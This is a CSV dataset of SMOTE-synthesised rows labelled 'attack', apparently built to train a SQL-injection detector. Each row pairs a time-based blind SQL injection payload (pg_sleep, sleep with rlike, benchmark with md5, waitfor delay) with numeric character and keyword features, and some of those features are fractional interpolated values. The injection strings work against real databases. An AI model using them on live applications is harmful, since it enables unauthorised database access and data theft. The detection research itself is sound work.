id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000776,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000072,0.8976485212730073,80.8659934799264,26.477665579987733,3.681126147947166,23.129442633312888,16.60710821330062,31.955331159975465,9.174111473337422,0.28609115037518923,0.20335663911951246,0.3956836278139192,0.11486858269137912,0.17411147333742227,0.0,2.0,0.0,0.0,1.8258885266625777,0.0,4.0,0.1741114733374222,1.0,0.0,3.8258885266625775,0.17411147333742233,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8258885266625776,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.825888526662578
SMOTE_000777,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.30736252742732895,92.06333337313828,22.687777791046088,2.9180140819214806,30.0,2.0,48.27148151244088,11.791851860697394,0.326177675218363,0.021745178347890873,0.5240840303857176,0.12799311604802846,0.0,0.0,0.0,0.0,1.0,0.0,0.0,9.895925930348696,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.8959259303486964,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000778,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000077,0.06458914146045029,62.0,16.053689326630824,2.860114326520496,22.071585768841103,1.0,29.946310673369172,8.982103557789724,0.35599331885227586,0.016129032258064516,0.4830050108607931,0.14487263802886652,0.0,3.0,0.0,0.0,0.0,0.9821035577897241,0.0,5.0,0.0,0.0,0.0,0.9821035577897241,0.0,1.0,0.0,0.0,0.0,0.9821035577897241,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000779,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,1.8627613598302304,87.18713569764262,24.471557790694785,3.3036779917420067,34.715577906947836,1.5284422093052168,39.47155779069478,11.471557790694783,0.3961530707370107,0.01795934825173648,0.45415282541685154,0.13173475559440118,1.943115581389567,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.5284422093052163,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.47155779069478354,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.471557790694783
SMOTE_000780,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",nearest_attack_euclidean,R000053,0.02398081130446945,88.02623462615952,28.00655865653988,3.8680949593393703,26.032793282699394,20.960648060760725,30.032793282699394,11.0,0.29572674266272225,0.23814057586432733,0.34116832634544975,0.12496435512750066,3.993441343460121,0.0,0.0,0.0,0.0,1.993441343460121,0.0,4.013117313079758,0.0,0.0,1.0,1.993441343460121,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.006558656539879082,0.0,0.0,0.0,1.0,0.993441343460121,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000781,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,1.489908966916548,89.46390440719924,21.428401958755217,2.9063460229543336,28.821301469066412,2.0,46.642602938132825,12.0,0.32212799595586267,0.02241067475494131,0.5209972807595481,0.13446404852964786,0.0,0.39289951031119574,0.0,0.0,1.0,0.0,0.0,9.607100489688804,0.0,0.0,0.0,1.0,0.0,0.39289951031119574,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.39289951031119563,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.392899510311196
SMOTE_000782,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000068,2.4501630655876148,89.70150517483894,26.663499529560095,3.583504679424287,31.63499529560096,10.0,36.72050799747837,11.346001881759618,0.3567558036804506,0.11184187823682697,0.4056841317865179,0.12571818629620446,0.0,4.0,0.0,0.0,0.0,1.0,0.0,5.346001881759617,0.0,0.6634995295600958,0.3365004704399042,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6634995295600958,0.0,0.0,0.6634995295600958,1.663499529560096,0.3365004704399041,0.0,0.0,0.0,0.0,0.0,0.0,0.33650047043990416,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.663499529560096
SMOTE_000783,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000043,0.9616387100378317,93.12614753360401,27.73230679051486,3.8452330380627737,20.0,29.732306790514855,32.92922716205944,10.46461358102972,0.2150092164267846,0.31947185635057307,0.3533477947671184,0.11217113245552382,0.7323067905148598,0.0,2.0,0.0,0.0,2.0,0.0,4.732306790514859,0.0,0.0,1.0,4.0,0.7323067905148596,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.7323067905148597,0.2676932094851403,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000784,attack,time,1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'zhhf' like 'zhhf,nearest_attack_euclidean,R000074,1.297681408676403,79.6570347491854,21.79962162214888,3.242812122871412,25.62813899674158,3.657034749185395,36.543343628665724,13.828517374592698,0.32139602267809625,0.045822859124693915,0.459210140075604,0.1735709781216058,5.657034749185394,0.0,0.0,0.0,0.0,0.17148262540730264,0.0,6.342965250814605,0.0,0.0,0.0,0.17148262540730275,1.0,0.0,0.0,0.0,0.0,0.17148262540730275,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.171482625407303,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17148262540730275,0.0,0.8285173745926973,0.8285173745926973,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000785,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000023,0.22423308956742943,75.92751929096237,22.0,3.319155024700036,15.0,18.0,33.142015432769895,9.785503858192474,0.19770692832531828,0.23724831399038193,0.43621925188141436,0.1288255058028854,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.785503858192473,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000786,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,nearest_attack_euclidean,R000033,1.1664809117064159,75.84410126922421,17.640683544870704,2.8698747176097674,25.640683544870704,1.3203417724353521,38.24239240704746,10.640683544870702,0.3389594384094056,0.017066882663049107,0.5038135925289923,0.14016008639855299,0.3203417724353512,0.0,0.0,0.0,1.0,0.0,0.0,8.320341772435352,0.0,0.0,0.0,1.0,0.32034177243535117,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.3203417724353512,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.320341772435351
SMOTE_000787,attack,time,1'  )   as xiqw where 8507  =  8507 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000007,0.2094957404642191,60.275743535662,23.0,3.6467601516074026,20.793192348253502,10.0,22.413615303493,7.0689358839155,0.34526065798080935,0.16594858454254685,0.37154962511068124,0.1172411323659625,1.0,0.0,2.0,0.0,0.0,1.0,0.0,3.0689358839154997,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.06893588391549987,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0689358839154997
SMOTE_000788,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000055,2.084417884398425,70.0628183172756,16.549745346179524,2.688935078989769,12.162309009634644,5.0994906923590495,38.575891288371665,14.225127326910238,0.1745429616923016,0.07484197620549343,0.5478234176622375,0.2027916444399675,4.0,0.0,0.0,0.0,0.0,1.3874363365448812,0.0,6.450254653820475,2.0,0.0,0.3874363365448812,1.3874363365448812,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000789,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000042,1.2608810889581439,89.32531361196983,23.950089603419954,3.338750627906396,36.85026881025986,1.2624775991450115,39.737522400854985,11.475044801709977,0.41024397099161203,0.014575350906290474,0.4467914847966136,0.12838919330548385,2.2125672025649656,0.2624775991450114,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.7375224008549885,0.26247759914501145,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000790,attack,time,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000048,1.9927016121073025,66.57428361066336,17.03464364600124,2.578512744618324,12.356429097334159,2.0,38.57428361066336,13.64357090266584,0.18692399637386342,0.030132689405094018,0.5781423483286836,0.20480096589235897,1.2871418053316803,2.71285819466832,0.0,0.0,0.0,1.0,0.0,6.64357090266584,2.0,0.0,0.0,1.0,0.32178545133291997,0.6782145486670799,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3217854513329201,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.32178545133292
SMOTE_000791,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000068,0.9543090065353625,82.57952413251574,26.405134631741866,3.7213907057526017,32.62053852696747,10.0,30.405134631741866,9.553850973806401,0.3913036117905411,0.12259224043463318,0.3705936379146941,0.11551050986013162,0.0,3.5538509738064006,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.702567315870934,0.1487163420645331,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.851283657935467
SMOTE_000792,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000052,0.0022317896952469473,82.0062281074522,23.999610743284236,3.180301257664726,30.000778513431527,2.003114053726099,39.002335540294574,11.0,0.3658383517767321,0.024420469909237894,0.47560336213458426,0.13413781617944573,0.9996107432842376,0.0,0.0,0.0,1.0,0.0003892567157623983,0.0,8.0,0.0,0.0,0.0,1.0003892567157626,0.9996107432842373,0.0,0.0,1.0,0.0,0.0003892567157625093,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0003892567157625093,1.0,0.0,0.0003892567157625093,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.000778513431525
SMOTE_000793,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000039,0.9717114939520423,56.4735751804229,19.1578583934743,3.2453903043773367,22.1578583934743,1.3157167869486006,24.526424819577098,8.473575180422902,0.3923793632158768,0.02306494094694271,0.4348185261458066,0.14973716969137388,3.315716786948601,0.0,0.0,0.0,0.0,1.0,0.0,3.8421416065256992,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8421416065256992,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8421416065256994,0.0,0.1578583934743007,0.1578583934743007,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000794,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,1.9089562059234935,68.34294678892378,22.0,3.3924066516510902,16.371394954153583,14.34294678892378,29.085736697230946,8.542868348615473,0.24166584958012183,0.20714390768270052,0.42619024273717765,0.125,0.0,0.45713165138452766,2.0,0.0,0.0,1.5428683486154724,0.0,4.0,0.0,0.0,0.5428683486154723,3.542868348615472,0.0,0.4571316513845277,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000795,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,1.4847407058107118,70.97906615961445,21.683108745242865,3.3067944594731125,15.0,15.464869961942927,31.147978707185793,9.366217490485733,0.21502776704115165,0.21432418186219104,0.43822349104935393,0.13242456004730335,0.0,0.0,2.0,0.0,0.0,1.683108745242866,0.0,4.683108745242866,0.0,0.0,1.0,3.683108745242866,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6831087452428659,0.0,0.316891254757134,0.6831087452428659,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.683108745242866
SMOTE_000796,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000005,1.9618037507361905,79.71895751495995,24.812468074621545,3.4248053344270675,16.187531925378455,19.812468074621545,33.93765962689227,9.78129788806768,0.20338528364425645,0.2512090839148027,0.42342821613028836,0.12197741631065252,0.406234037310773,0.593765962689227,0.0,0.0,0.0,1.0,0.0,6.187531925378454,0.0,0.0,1.0,1.0,0.40623403731077296,0.5937659626892269,0.0,0.5937659626892271,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000797,attack,time,1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000050,0.9162288426108688,81.74513837071505,27.593142296339384,3.681754312650572,24.593142296339384,16.372569185357527,31.982855740848457,8.796571148169692,0.3020952490913847,0.1981680972007705,0.3918078724191853,0.10792878128865954,0.0,0.0,2.0,0.0,0.0,1.796571148169691,0.0,4.0,0.0,1.0,0.0,3.796571148169691,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7965711481696911,1.0,0.7965711481696911,0.2034288518303089,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.796571148169691
SMOTE_000798,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,1.7563812547199402,71.4096505546821,22.43002688040907,3.3361681977231017,16.290080641227206,14.559784956727444,31.419838717545584,9.13994623918186,0.23197878471068661,0.2004321695786801,0.4398132025957424,0.12777584311489087,0.43002688040906945,0.0,2.0,0.0,0.0,1.5699731195909306,0.0,4.56997311959093,0.0,0.0,0.5699731195909307,3.5699731195909306,0.4300268804090694,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000799,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000065,0.5175619249045575,70.9678594602959,22.129017567463013,3.406328855420825,15.387052702389036,16.967859460295898,29.741964865073975,8.870982432536987,0.21774086429417802,0.23790460305034258,0.41935453265547945,0.125,0.12901756746301252,0.0,2.0,0.0,0.0,1.8709824325369877,0.0,4.0,0.0,0.0,0.8709824325369875,3.8709824325369873,0.12901756746301263,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000800,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.8239707199625662,92.5750576839842,22.85835256132807,2.926428498770029,29.716705122656137,1.8583525613280667,48.575057683984205,12.424942316015798,0.3209560150403219,0.02003305529695841,0.5246478540137759,0.1343630756489437,0.42494231601579724,0.0,0.0,0.0,1.0,0.14164743867193252,0.0,9.858352561328068,0.1416474386719324,0.0,0.0,1.1416474386719324,0.14164743867193247,0.0,0.0,0.8583525613280676,0.0,0.1416474386719324,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.14164743867193236,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.141647438671932
SMOTE_000801,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000077,2.1780037687384026,73.47391491074488,19.278261403069962,2.974722315314562,22.98347842092099,3.9504352627629675,35.90087052552594,10.639130701534983,0.3230045783273552,0.04463802317601584,0.4874686606684839,0.14488873782814515,0.0,3.3278261403069966,0.0,0.0,0.0,1.0,0.0,5.9834784209209895,0.0,0.0,0.32782614030699664,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6721738596930035,0.0,0.0,0.0,1.0,0.32782614030699647,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000802,attack,time,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000022,1.6081009036175649,89.66099471482161,26.667801057035675,3.8076353655584034,20.664397885928647,28.33560211407135,31.328795771857294,9.332198942964324,0.23035766369321709,0.31651565729575415,0.3491085271846033,0.10401815182642546,0.33219894296432373,0.0,1.3356021140713525,0.0,0.0,2.0,0.0,4.3321989429643235,0.0,0.0,1.0,3.3356021140713525,0.3321989429643237,0.0,0.6678010570356763,0.3321989429643237,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000803,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000030,0.02775026186056803,98.88213509559861,23.960711698532872,2.895620822813811,29.976427019119722,2.0,52.92142339706574,13.984284679413149,0.3031748703733639,0.020230366739875272,0.5351692828574774,0.14142548002928343,1.0,0.0,0.0,0.0,1.0,0.0,0.0,10.984284679413149,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.007857660293425828,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.007857660293426
SMOTE_000804,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000040,0.2184876774732956,59.225687259577086,20.18807271631424,3.466697576294014,23.0,3.338530889365635,21.962385456737152,10.924770913474303,0.3884769734106198,0.05587907710400032,0.37100798493788684,0.18463596454749306,4.887156370211455,0.0,0.0752290865256966,0.0,0.0,1.0,0.0,2.962385456737152,0.0,0.0,0.0,1.0752290865256968,1.0,0.0,0.0376145432628483,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0376145432628483,0.0,0.9623854567371517,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000805,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000068,3.2770890270307222,90.95075701790199,26.54993118019073,3.521750248489811,30.499311801907282,10.0,38.651169936757626,11.800275279237088,0.3398063197479569,0.11034433347170704,0.4209454743474219,0.12890387243291412,0.0,4.0,0.0,0.0,0.0,1.0,0.0,5.800275279237088,0.0,0.5499311801907281,0.450068819809272,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5499311801907281,0.0,0.0,0.5499311801907281,1.549931180190728,0.4500688198092719,0.0,0.0,0.0,0.0,0.0,0.0,0.4500688198092719,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.549931180190728
SMOTE_000806,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000072,0.006946050174237333,83.97158978767278,26.99810598584485,3.707895995590238,23.99810598584485,17.984847886758818,32.99052992922426,8.998105985844852,0.2858044768645308,0.21415434891470506,0.39288165132188335,0.10715952289888069,0.0,0.0,2.0,0.0,0.0,1.9981059858448522,0.0,4.0,0.0,1.0,0.0,3.998105985844852,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9981059858448521,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9981059858448518
